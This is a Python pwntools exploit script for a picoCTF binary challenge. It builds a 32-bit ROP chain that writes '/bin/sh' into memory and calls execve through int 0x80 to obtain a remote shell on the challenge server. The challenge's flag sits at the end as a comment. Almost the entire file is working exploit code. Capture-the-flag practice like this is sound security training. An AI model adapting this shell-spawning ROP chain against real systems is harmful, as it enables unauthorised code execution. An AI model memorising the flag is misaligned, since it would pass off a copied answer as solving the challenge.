#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template vuln
from pwn import *
from struct import pack

HOST, PORT = "saturn.picoctf.net 61621".split()
# Set up pwntools for the correct architecture
exe = context.binary = ELF('vuln')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote(HOST, PORT)
    p = process([exe.path] + argv, *a, **kw)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)

    return p

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX disabled
# PIE:      No PIE (0x8048000)
# RWX:      Has RWX segments

io = start()

offset = 0x1c

p = lambda x : pack(b'I', x)

IMAGE_BASE_0 = 0x08048000
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

rop = b''

rop += rebase_0(0x0006874a) # 0x080b074a: pop eax; ret; 
rop += b'//bi'
rop += rebase_0(0x000103c9) # 0x080583c9: pop edx; pop ebx; ret; 
rop += rebase_0(0x0009d060)
rop += p(0xdeadbeef)
rop += rebase_0(0x00011102) # 0x08059102: mov dword ptr [edx], eax; ret; 
rop += rebase_0(0x0006874a) # 0x080b074a: pop eax; ret; 
rop += b'n/sh'
rop += rebase_0(0x000103c9) # 0x080583c9: pop edx; pop ebx; ret; 
rop += rebase_0(0x0009d064)
rop += p(0xdeadbeef)
rop += rebase_0(0x00011102) # 0x08059102: mov dword ptr [edx], eax; ret; 
rop += rebase_0(0x0006874a) # 0x080b074a: pop eax; ret; 
rop += p(0x00000000)
rop += rebase_0(0x000103c9) # 0x080583c9: pop edx; pop ebx; ret; 
rop += rebase_0(0x0009d068)
rop += p(0xdeadbeef)
rop += rebase_0(0x00011102) # 0x08059102: mov dword ptr [edx], eax; ret; 
rop += rebase_0(0x00001022) # 0x08049022: pop ebx; ret; 
rop += rebase_0(0x0009d060)
rop += rebase_0(0x00001e39) # 0x08049e39: pop ecx; ret; 
rop += rebase_0(0x0009d068)
rop += rebase_0(0x0004a435) # 0x08092435: pop edx; xor eax, eax; pop edi; ret; 
rop += rebase_0(0x0009d068)
rop += p(0xdeadbeef)
rop += rebase_0(0x0006874a) # 0x080b074a: pop eax; ret; 
rop += p(0x0000000b)
rop += rebase_0(0x00029650) # 0x08071650: int 0x80; ret;

payload = b""
payload += cyclic_gen().get(offset - len(payload))
payload += rop
io.sendlineafter(b"grasshopper!", payload)
io.interactive()

# picoCTF{5n47ch_7h3_5h311_0f7662f4}
